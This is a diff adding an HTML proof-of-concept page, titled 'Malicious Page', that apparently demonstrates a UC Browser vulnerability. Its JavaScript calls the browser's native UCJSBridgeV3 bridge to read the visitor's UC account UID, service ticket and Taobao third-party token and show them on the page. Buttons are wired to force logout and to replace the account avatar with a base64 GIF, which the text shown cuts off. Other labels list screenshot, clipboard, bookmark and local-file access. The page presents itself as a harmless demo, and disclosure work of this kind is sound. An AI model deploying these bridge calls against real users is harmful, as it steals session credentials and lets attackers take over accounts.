@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            padding: 15px;
+        }
+
+        @media screen and (min-width: 700px) {
+            .container {
+                width: 70%;
+                margin: auto;
+            }
+        }
+
+        p {
+            white-space: pre-wrap; 
+            word-wrap: break-word; 
+            overflow-wrap: break-word; 
+        }
+
+        .bold-and-larger {
+            font-weight: bold; 
+            font-size: 1.5em; 
+        }
+
+        .larger {
+            font-weight: bold; 
+            font-size: 1.2em; 
+        }
+
+    </style>
+    <title>Malicious Page</title>
+
+</head>
+
+
+<body>
+    <h1>Malicious Page</h1>
+
+    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>
+
+    <p><span class="bold-and-larger">An attacker can:</span></p>
+
+    <p><span class="larger">Get Your UC Account Info:</span></p>
+    <p style="font-size: 15px;" id="AccountNickname"></p>
+    <p style="font-size: 15px;" id="AccountAvatarText">Your UC Avatar: </p>
+    <div class="image-with-text">
+        <img id="AccountAvatar" src="" alt="" width="30%" height="auto">
+    </div>
+    <p style="font-size: 15px;" id="AccountUid"></p>
+    <p style="font-size: 15px;" id="AccountTicket"></p> 
+    <p style="font-size: 15px;" id="AccountMobileWG"></p> 
+
+    <p><span class="larger">Get Your Location Info:</span></p>
+    <p style="font-size: 15px;" id="Country"></p>
+    <p style="font-size: 15px;" id="Province"></p>
+    <p style="font-size: 15px;" id="City"></p>
+    <p style="font-size: 15px;" id="BroadbandNetwork"></p>
+
+    <p><span class="larger">Get Your Device Info:</span></p>
+    <p style="font-size: 15px;" id="IDFA"></p>
+    <p style="font-size: 15px;" id="Battery"></p>
+    <p style="font-size: 15px;" id="Sound"></p>
+    <p style="font-size: 15px;" id="TotalStorage"></p>
+    <p style="font-size: 15px;" id="RemainingStorage"></p>
+
+    <p><span class="larger">Get Your Third Party Account Info:</span></p>
+    <p style="font-size: 15px;" id="ThirdPartyType"></p>
+    <p style="font-size: 15px;" id="ThirdPartyToken"></p>
+    <p style="font-size: 15px;" id="ThirdPartyNickname"></p>
+    <p style="font-size: 15px;" id="ThirdPartyAvatarText">Your Third Party Avatar: </p>
+    <div class="image-with-text">
+        <img id="ThirdPartyAvatar" src="" alt="" width="30%" height="auto">
+    </div>   
+    <p></p> 
+
+    <p><span class="larger">Access Local Photo on Your Phone:</span></p>
+    Will get your recent screenshot on your phone:
+    <input type="button" value="Access ScreenShot" id="AccessScreenShot" style="font-size: 20px; padding: 20px 25px;"/>
+    <div>
+        <img id="RecentScreenShot" src="" alt="" width="80%" height="auto">
+    </div> 
+
+    <p><span class="larger">Get Your Local Album Info:</span></p>
+    Will get infomation about your album on your phone:
+    <p style="font-size: 15px;" id="ImageCount"></p>
+    <p style="font-size: 15px;" id="VideoCount"></p>
+    <p style="font-size: 15px;" id="AlbumInfo"></p>
+
+    <p><span class="larger">Read Your ClipBoard:</span></p>
+    Will get your ClipBoard text:
+    <p style="font-size: 15px;" id="ClipBoardText"></p>
+    <input type="button" value="Access ClipBoard" id="AccessClipBoard" style="font-size: 20px; padding: 20px 25px;"/> 
+
+    <p><span class="larger">Write to Your ClipBoard:</span></p>
+    Will copy the following text to your ClipBoard:
+    <p style="font-size: 15px;" id="ClipBoardWriteText"></p>
+    <script>
+        const now = new Date();
+        const timeStringSeconds = now.toLocaleDateString('en-US') + ' ' + now.toLocaleTimeString('en-US');
+        document.getElementById("ClipBoardWriteText").innerText = "I can write to your ClipBoard! " + timeStringSeconds;
+    </script>
+    <input type="button" value="Write to ClipBoard" id="WriteClipBoard" style="font-size: 20px; padding: 20px 25px;"/>
+
+    <p><span class="larger">Tamper with Your Account Avatar:</span></p>
+    <p>Will change user's UC account avator to this image:</p>
+    <div class="image-with-text">
+        <img src="./uploadAvator.gif" alt="" width="30%" height="auto">
+    </div> 
+    <input type="button" value="Change User Avator" id="ChangeAvator" style="font-size: 20px; padding: 20px 25px;"/>
+
+    <p><span class="larger">Forcefully log out your account:</span></p>
+    <p></p>
+    <input type="button" value="Log out User" id="LogOutUser" style="font-size: 20px; padding: 20px 25px;"/>
+    <p></p>
+
+    <p><span class="larger">Get your BookMark List:</span></p>
+    <p style="font-size: 15px;" id="BookMarkList"></p>
+
+    <p><span class="larger">Add BookMarks to your browser:</span></p>
+    Will add the following Bookmark to your browser:<br>
+        url: "https://zhouziyi1.github.io",<br>
+        title: "[attacker added] Bookmark page"
+    <input type="button" value="Add BookMark" id="AddBookMark" style="font-size: 20px; padding: 20px 25px;"/>
+
+    <p><span class="larger">Open Local File on your phone:</span></p>
+    Will open the following file on your phone:<br>
+    "/private/var/mobile/Documents/localPDF.pdf"
+    <input type="button" value="Open Local File" id="OpenFile" style="font-size: 20px; padding: 20px 25px;"/>
+
+    <p><span class="larger">Get Your Novel Reading Record:</span></p>
+    <p style="font-size: 15px;" id="NovelRecord"></p>
+
+    <p><span class="larger">Get Your Novel BookShelf Info:</span></p>
+    <p style="font-size: 15px;" id="NovelBookShelf"></p>
+
+    <p><span class="larger">Remove Novel from Your BookShelf:</span></p>
+    Will remove the following novel from your bookshelf:<br>
+    <p>{"cover_url":"http://img-tailor.11222.cn/bcv/big/1154147955743_sa.jpg","author":"微微鸿气","is_finish":0,"category":"","iflow":{"title":""},"book_id":"7955743","type":"shuqi","book_name":"鸿蒙天帝","tags":""}</p>
+    <input type="button" value="Remove Novel" id="RemoveNovel" style="font-size: 20px; padding: 20px 25px;"/>
+
+    <p><span class="larger">Vibrate Your Device:</span></p>
+    <input type="button" value="Vibrate Device" id="VibrateDevice" style="font-size: 20px; padding: 20px 25px;"/>
+
+    <script>
+        
+    var r = +new Date;
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "account.getThirdPartyToken",
+        methodParams: {vCode: r, type: "taobao"},
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+
+        var ThirdPartyType = json.type;
+        document.getElementById("ThirdPartyType").innerText = "Your Bind Account Type: \n" + ThirdPartyType;
+
+        var ThirdPartyToken = json.third_kps;
+        document.getElementById("ThirdPartyToken").innerText = "Your " + json.type +" Account Token: " + ThirdPartyToken;
+
+        var ThirdPartyNickname = json.third_nickname;
+        document.getElementById("ThirdPartyNickname").innerText = "Your " + json.type +" Account Nickname: " + ThirdPartyNickname;
+
+        var ThirdPartyAvatar = json.third_avatar_url;
+        document.getElementById("ThirdPartyAvatarText").innerText = "Your " + json.type +" Account Avatar: ";
+        document.getElementById("ThirdPartyAvatar").src = ThirdPartyAvatar;
+    });
+
+    var r = +new Date;
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "account.getUserInfo",
+        methodParams: {vCode: r},
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+
+        var AccountNickname = json.self_nickname;
+        document.getElementById("AccountNickname").innerText = "Your UC Account Nickname: " + AccountNickname;
+
+        var Avatar = json.avatar_url;
+        document.getElementById("AccountAvatar").src = Avatar;
+        
+        var AccountUid = json.uId;
+        document.getElementById("AccountUid").innerText = "Your UC Account UID: " + AccountUid;
+
+        var AccountTicket = json.service_ticket;
+        document.getElementById("AccountTicket").innerText = "Your UC Account Ticket: " + AccountTicket;
+
+        var AccountMobileWG = json.mobile_wg;
+        document.getElementById("AccountMobileWG").innerText = "Your UC Account Mobile_wg: " + AccountMobileWG;
+    });
+
+
+    document.getElementById("LogOutUser").onclick = function () {
+        var r = +new Date;
+        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+            invokeId: "callback",
+            methodName: "account.logout",
+            methodParams: { vCode: r },
+            pageURL: "https://www.uc.cn/",
+            windowId: window.ucapi.windowId
+        }).then(function (a) {
+        });
+    }
+
+    document.getElementById("ChangeAvator").onclick = function () {
+        var avatorb64 = "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